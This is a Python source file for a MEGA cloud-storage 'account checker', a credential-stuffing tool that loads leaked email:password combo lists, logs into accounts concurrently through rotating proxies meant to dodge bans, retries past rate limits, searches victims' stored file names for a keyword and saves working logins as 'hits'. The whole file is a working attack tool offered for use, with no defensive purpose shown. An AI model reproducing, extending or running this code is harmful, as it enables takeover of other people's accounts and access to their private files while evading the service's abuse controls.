"""
Mega.nz Account Checker v3.0 by Thomas Hermes
─────────────────────────────
- Standalone MEGA API client (no mega.py / tenacity)
- Proxy support (file-based rotation for anti-ban)
- ThreadPoolExecutor with configurable thread count
- Thread-safe counters and file writing
- Exponential backoff retry logic
- Graceful error handling with typed exceptions
- Real-time console title updates via Win32 API

Dependencies: requests, pycryptodome, colorama
"""

import os
import sys
import subprocess
import importlib.util

def install_dependencies():
    """Checks and installs missing dependencies."""
    required_libraries = [
        ("requests", "requests"),
        ("Crypto", "pycryptodome"),
        ("colorama", "colorama")
    ]
    
    missing = []
    for module_name, package_name in required_libraries:
        if importlib.util.find_spec(module_name) is None:
            missing.append(package_name)
    
    if missing:
        print(f"[*] Missing dependencies found: {', '.join(missing)}")
        print("[*] Attempting to install missing libraries...")
        try:
            # Try to upgrade pip first
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], 
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Install missing packages
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
            print("[*] Installation successful. Restarting script...")
            # Restart the script to ensure all new modules are available in the path
            os.execv(sys.executable, ['python'] + sys.argv)
        except Exception as e:
            print(f"[!] Error during installation: {e}")
            print(f"[!] Please install them manually: pip install {' '.join(missing)}")
            sys.exit(1)

# Run dependency check BEFORE other imports
if __name__ == "__main__":
    # If we are being run directly, check dependencies
    install_dependencies()

import time
import ctypes
import random
import threading
import asyncio
import aiohttp
from datetime import datetime

import colorama
from colorama import Fore, Style

from mega_api import (
    MegaClient,
    MegaLoginError,
    MegaBlockedError,
    MegaRateLimitError,
    MegaTempError,
    MegaError,
)

# ─── Fix Console Encoding ────────────────────────────────────
# Do this BEFORE colorama.init()
if sys.stdout.encoding.lower() != 'utf-8':
    try:
        # Python 3.7+
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except AttributeError:
        pass

colorama.init(autoreset=True)

# ─── Constants ────────────────────────────────────────────────
MAX_RETRIES = 3
RETRY_BASE_DELAY = 3        # seconds, multiplied by attempt number
RATE_LIMIT_DELAY = 15       # seconds to wait on rate limit (error -4)
TEMP_ERROR_DELAY = 5        # seconds to wait on temp errors (-3, -6, -18)


# ─── Thread-safe stats ───────────────────────────────────────

class Stats:
    """Thread-safe counters for check results."""

    def __init__(self, total: int = 0):
        self._lock = threading.Lock()
        self.checked = 0
        self.hits = 0
        self.customs = 0
        self.fails = 0
        self.errors = 0
        self.waiting = 0
        self.total = total

    def inc_waiting(self):
        with self._lock:
            self.waiting += 1
            
    def dec_waiting(self):
        with self._lock:
            self.waiting -= 1

    def inc_checked(self) -> int:
        with self._lock:
            self.checked += 1
            return self.checked

    def inc_hits(self) -> int:
        with self._lock:
            self.hits += 1
            return self.hits

    def inc_customs(self) -> int:
        with self._lock:
            self.customs += 1
            return self.customs

    def inc_fails(self) -> int:
        with self._lock:
            self.fails += 1
            return self.fails

    def inc_errors(self) -> int:
        with self._lock:
            self.errors += 1
            return self.errors

    def snapshot(self) -> tuple:
        with self._lock:
            return (self.checked, self.hits, self.customs, self.fails, self.errors, self.waiting)


# ─── Thread-safe file writer ─────────────────────────────────

class FileWriter:
    """Thread-safe file writer for saving hits."""

    def __init__(self, filepath: str):
        self.filepath = filepath
        self._lock = threading.Lock()

    def write(self, line: str):
        with self._lock:
            with open(self.filepath, "a", encoding="utf-8") as f:
                f.write(line + "\n")


# ─── Proxy Pool ───────────────────────────────────────────────

class ProxyPool:
    """
    Thread-safe proxy pool with round-robin rotation.
    Loads proxies from a text file (one per line).
    Supports formats:
        host:port
        user:pass@host:port
        http://host:port
        socks5://user:pass@host:port
    """

    def __init__(self, filepath: str = ""):
        self._proxies = []
        self._index = 0
        self._lock = threading.Lock()

        if filepath and os.path.isfile(filepath):
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    proxy = line.strip()
                    if not proxy or proxy.startswith("#"):
                        continue
                    # Normalize: add http:// if no scheme
                    if "://" not in proxy:
                        proxy = f"http://{proxy}"
                    self._proxies.append(proxy)

    @property
    def available(self) -> bool:
        return len(self._proxies) > 0

    @property
    def count(self) -> int:
        return len(self._proxies)

    def get(self) -> str | None:
        """Get next proxy (round-robin). Returns None if no proxies loaded."""
        if not self._proxies:
            return None
        with self._lock:
            proxy = self._proxies[self._index % len(self._proxies)]
            self._index += 1
            return proxy

    def get_random(self) -> str | None:
        """Get random proxy. Returns None if no proxies loaded."""
        if not self._proxies:
            return None
        return random.choice(self._proxies)


# ─── Console Logger ──────────────────────────────────────────

_print_lock = threading.Lock()

def _safe_print(msg: str):
    """Thread-safe print."""
    with _print_lock:
        print(msg)

def log_hit(msg: str):
    _safe_print(f"{Fore.GREEN}[  HIT   ] {Style.RESET_ALL}{msg}")

def log_fail(msg: str):
    _safe_print(f"{Fore.RED}[  FAIL  ] {Style.RESET_ALL}{msg}")

def log_custom(msg: str):
    _safe_print(f"{Fore.YELLOW}[ CUSTOM ] {Style.RESET_ALL}{msg}")

def log_error(msg: str):
    _safe_print(f"{Fore.MAGENTA}[ ERROR  ] {Style.RESET_ALL}{msg}")

def log_info(msg: str):
    _safe_print(f"{Fore.CYAN}[  INFO  ] {Style.RESET_ALL}{msg}")

def log_retry(msg: str):
    _safe_print(f"{Fore.BLUE}[ RETRY  ] {Style.RESET_ALL}{msg}")


# ─── Console title (Win32 API) ────────────────────────────────

def set_title(title: str):
    """Set console window title via Win32 API (safe on non-Windows)."""
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    except Exception:
        pass


# ─── Account checker ─────────────────────────────────────────

async def check_account(
    email: str,
    password: str,
    stats: Stats,
    writer: FileWriter,
    proxy_pool: ProxyPool,
    search_string: str = "",
    semaphore: asyncio.Semaphore = None
):
    if semaphore:
        await semaphore.acquire()
        
    last_error = ""

    try:
        for attempt in range(1, MAX_RETRIES + 1):
            proxy = proxy_pool.get_random() if proxy_pool.available else None
            client = None

            try:
                client = MegaClient(proxy=proxy)
                await client.login(email, password)

                storage = await client.get_storage()
                used_gb = storage['used_gb']
                total_gb = storage['total_gb']

                keyword_found = False
                if search_string:
                    try:
                        file_names = await client.get_file_names()
                        keyword_found = any(
                            search_string.lower() in name.lower()
                            for name in file_names
                        )
                    except Exception:
                        keyword_found = False

                current = stats.inc_checked()
                stats.inc_hits()

                hit_line = (
                    f"{email}:{password} | "
                    f"Used: {used_gb}GB / {total_gb}GB | "
                    f"Keyword: {search_string or 'N/A'} = "
                    f"{'TRUE' if keyword_found else 'FALSE'} | "
                    f"[{current}/{stats.total}]"
                )

                log_hit(hit_line)
                writer.write(hit_line)
                return

            except MegaLoginError:
                current = stats.inc_checked()
                stats.inc_fails()
                log_fail(f"{email}:{password} [{current}/{stats.total}]")
                return

            except MegaBlockedError as e:
                current = stats.inc_checked()
                stats.inc_customs()
                log_custom(f"{email}:{password} — {e.message} [{current}/{stats.total}]")
                return

            except MegaRateLimitError as e:
                last_error = f"Rate limit ({e.code})"
                if attempt < MAX_RETRIES:
                    log_retry(f"{email} — rate limited, waiting {RATE_LIMIT_DELAY}s (attempt {attempt}/{MAX_RETRIES})")
                    stats.inc_waiting()
                    await asyncio.sleep(RATE_LIMIT_DELAY)
                    stats.dec_waiting()
                    continue

            except MegaTempError as e:
                last_error = f"Temp error ({e.code})"
                if attempt < MAX_RETRIES:
                    delay = TEMP_ERROR_DELAY * attempt
                    log_retry(f"{email} — temp error, waiting {delay}s (attempt {attempt}/{MAX_RETRIES})")
                    stats.inc_waiting()
                    await asyncio.sleep(delay)
                    stats.dec_waiting()
                    continue

            except (MegaError, Exception) as e:
                # Fallback for network and other errors
                last_error = str(e)[:100]
                if attempt < MAX_RETRIES:
                    delay = RETRY_BASE_DELAY * attempt
                    await asyncio.sleep(delay)
                    continue

            finally:
                if client:
                    await client.close()

        # All retries exhausted
        current = stats.inc_checked()
        stats.inc_errors()
        log_error(f"{email}:{password} — {last_error} [{current}/{stats.total}]")
        
    finally:
        if semaphore:
            semaphore.release()


# ─── Combo parser ─── ─────────────────────────────────────────────

def parse_combo(filepath: str) -> list[tuple[str, str]]:
    """Parse combo file (mail:pass or mail;pass, one per line)."""
    pairs = []
    skipped = 0

    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            # Support : and ; delimiters
            sep = ":" if ":" in line else (";" if ";" in line else None)
            if not sep:
                skipped += 1
                continue

            parts = line.split(sep, 1)
            if len(parts) != 2:
                skipped += 1
                continue

            email, password = parts[0].strip(), parts[1].strip()
            if not email or not password:
                skipped += 1
                continue

            pairs.append((email, password))

    if skipped > 0:
        log_info(f"Skipped {skipped} invalid lines")

    return pairs


# ─── Logo ─────────────────────────────────────────────────────

def print_logo():
    logo = f"""
{Fore.CYAN}
    ╔══════════════════════════════════════════════════════╗
    ║    {Fore.WHITE}MEGA.NZ ACCOUNT CHECKER v3.0 by Thomas Hermes{Fore.CYAN}     ║
    ╠══════════════════════════════════════════════════════╣
    ║  {Fore.GREEN}• Standalone MEGA API (zero bloat deps){Fore.CYAN}           ║
    ║  {Fore.GREEN}• Proxy rotation (HTTP/SOCKS5){Fore.CYAN}                    ║
    ║  {Fore.GREEN}• Thread-safe multithreading{Fore.CYAN}                      ║
    ║  {Fore.GREEN}• Smart retry with backoff{Fore.CYAN}                        ║
    ║  {Fore.GREEN}• Keyword file search{Fore.CYAN}                             ║
    ╚══════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
    try:
        print(logo)
    except UnicodeEncodeError:
        # Fallback to ASCII logo if UTF-8 is still failing
        print("\n" + "="*54)
        print("    MEGA.NZ ACCOUNT CHECKER v3.0 by Thomas Hermes")
        print("="*54)
        print("  * Standalone MEGA API")
        print("  * Proxy rotation")
        print("  * Thread-safe multithreading")
        print("="*54 + "\n")


# ─── Title updater thread ─────────────────────────────────────

def _title_updater(stats: Stats, filename: str, stop: threading.Event):
    """Background thread that updates the console title every 2 seconds."""
    while not stop.is_set():
        c, h, cu, f, e, w = stats.snapshot()
        pct = round(c / stats.total * 100, 1) if stats.total > 0 else 0
        set_title(
            f"Mega Checker v3 — "
            f"{pct}% — "
            f"Checked {c}/{stats.total} — "
            f"Waiting {w} — "
            f"Hits {h} — Custom {cu} — "
            f"Fail {f} — Errors {e} — "
            f"{filename}"
        )
        stop.wait(2)


# ─── MAIN ─────────────────────────────────────────────────────

async def amain():
    set_title("Mega.nz Checker v3.0 (Async)")
    print_logo()

    combo_path = "combo.txt"
    if not os.path.isfile(combo_path):
        with open(combo_path, "w", encoding="utf-8") as f:
            pass
        log_info(f"Created empty {combo_path}")

    print(f"\n{'═' * 60}")
    input(f"\n  Place mail:pass pairs in {combo_path} and press Enter\n")

    pairs = parse_combo(combo_path)
    if not pairs:
        log_error("No valid email:password pairs found!")
        sys.exit(1)

    log_info(f"Loaded {len(pairs)} pairs")

    print(f"\n{'═' * 60}")
    proxy_path = input("\n  Proxy file path (or Enter to skip): ").strip()
    proxy_pool = ProxyPool(proxy_path)
    if proxy_pool.available:
        log_info(f"Loaded {proxy_pool.count} proxies from {proxy_path}")
    else:
        log_info("No proxies — direct connection mode")

    print(f"\n{'═' * 60}")
    pool_size = 5
    try:
        user_input = input(f"\n  Concurrent accounts (default {pool_size}): ").strip()
        if user_input:
            pool_size = max(1, min(int(user_input), 500))
    except ValueError:
        pass
    log_info(f"Concurrency: {pool_size}")

    print(f"\n{'═' * 60}")
    name = input("\n  Output filename (without extension): ").strip() or "results"
    for char in '<>:"/\\|?*':
        name = name.replace(char, "")
    filename = f"hits_{name}.txt"
    log_info(f"Hits → {filename}")

    print(f"\n{'═' * 60}")
    search_string = input("\n  Keyword to search in files (or Enter to skip): ").strip()
    if search_string:
        log_info(f"Keyword: '{search_string}'")
    else:
        log_info("Keyword search: off")

    print(f"\n{'═' * 60}")
    print(f"\n  {Fore.WHITE}Summary:{Style.RESET_ALL}")
    print(f"  Pairs:    {len(pairs)}")
    print(f"  Proxies:  {proxy_pool.count if proxy_pool.available else 'none (direct)'}")
    print(f"  Concurrency: {pool_size}")
    print(f"  Output:   {filename}")
    print(f"  Keyword:  {search_string or 'disabled'}")
    input(f"\n  Press Enter to start...\n")

    stats = Stats(total=len(pairs))
    writer = FileWriter(filename)

    stop_event = threading.Event()
    threading.Thread(
        target=_title_updater,
        args=(stats, filename, stop_event),
        daemon=True,
    ).start()

    start_time = time.time()
    log_info(f"Checking {len(pairs)} accounts...")
    print(f"{'─' * 60}\n")

    semaphore = asyncio.Semaphore(pool_size)
    tasks = []
    for email, password in pairs:
        tasks.append(
            asyncio.create_task(check_account(email, password, stats, writer, proxy_pool, search_string, semaphore))
        )
        
    await asyncio.gather(*tasks, return_exceptions=True)

    stop_event.set()
    elapsed = round(time.time() - start_time, 1)
    c, h, cu, f_c, e, _ = stats.snapshot()

    print(f"\n{'═' * 60}")
    print(
        f"\n  {Fore.WHITE}Results:{Style.RESET_ALL}\n"
        f"  {Fore.GREEN}Hits:{Style.RESET_ALL}     {h}\n"
        f"  {Fore.YELLOW}Custom:{Style.RESET_ALL}   {cu}\n"
        f"  {Fore.RED}Fail:{Style.RESET_ALL}     {f_c}\n"
        f"  {Fore.MAGENTA}Errors:{Style.RESET_ALL}   {e}\n"
        f"  {Fore.CYAN}Total:{Style.RESET_ALL}    {c}/{stats.total}\n"
        f"  {Fore.CYAN}Time:{Style.RESET_ALL}     {elapsed}s\n"
        f"  {Fore.CYAN}File:{Style.RESET_ALL}     {filename}\n"
    )

    set_title(
        f"DONE — Hits {h} — Custom {cu} — Fail {f_c} — Errors {e} — {elapsed}s"
    )
    input("  Press Enter to exit...")

def main():
    asyncio.run(amain())

if __name__ == '__main__':
    main()
